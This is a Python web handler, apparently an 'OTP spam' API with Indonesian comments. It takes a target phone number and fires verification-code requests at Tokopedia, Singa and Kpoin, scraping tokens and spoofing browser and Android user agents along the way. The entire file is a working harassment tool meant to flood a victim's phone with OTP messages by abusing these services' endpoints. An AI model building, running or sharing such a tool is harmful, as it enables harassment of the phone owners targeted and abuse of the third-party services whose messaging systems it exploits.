from http.server import BaseHTTPRequestHandler
import json
import requests
import re
import random
import time

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = json.loads(self.rfile.read(content_length))
            target = post_data.get('nomor')
            
            # Panggil semua API OTP
            result = spam_otp_all(target)
            
            response = json.dumps({'success': result})
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
        except Exception as e:
            response = json.dumps({'success': False, 'error': str(e)})
            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(response.encode())
    
    def do_GET(self):
        response = json.dumps({'status': True, 'message': 'API OTP Online'})
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(response.encode())

def spam_otp_all(nomor):
    hasil = []
    
    # Panggil semua fungsi OTP
    hasil.append(spam_otp_tokopediaa(nomor))
    hasil.append(spam_otp_singa1(nomor))
    hasil.append(spam_otp_kpoin(nomor))
    
    # Kalau ada yang sukses, return True
    return any(hasil)

# ============ API OTP FUNCTIONS ============
def spam_otp_tokopediaa(nomor):
    try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False

def spam_otp_singa1(nomor):
    try:
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api102.singa.id/new/login/sendWaOtp"
        params = {
            "versionName": "2.4.7",
            "versionCode": "143",
            "model": "SM-S928B",
            "systemVersion": "14",
            "platform": "android",
            "appsflyer_id": ""
        }
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36"
        }
        payload = {
            "mobile_phone": phone,
            "type": "mobile",
            "is_switchable": 1
        }
        resp = requests.post(url, params=params, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_kpoin(nomor):
    try:
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://app.kpoin.com"

        ua = random.choice([
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36"
        ])

        get_url = f"{base_url}/registration"
        headers_get = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        resp_get = session.get(get_url, headers=headers_get, timeout=15)
        if resp_get.status_code != 200:
            return False

        post_url = f"{base_url}/api/bff/v1/notification/sendotp"
        headers_post = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": get_url,
            "Applicationbrand": "0",
            "Applicationchannel": "901101",
            "Applicationstoreid": "0"
        }

        payload = {
            "UniqueID": phone,
            "NotifType": "109104",
            "OtpType": "119103",
            "OtpDigit": 6
        }

        resp = session.post(post_url, json=payload, headers=headers_post, timeout=15)

        if resp.status_code == 200:
            try:
                data = resp.json()
                return True
            except:
                return True
        return False

    except Exception as e:
        return False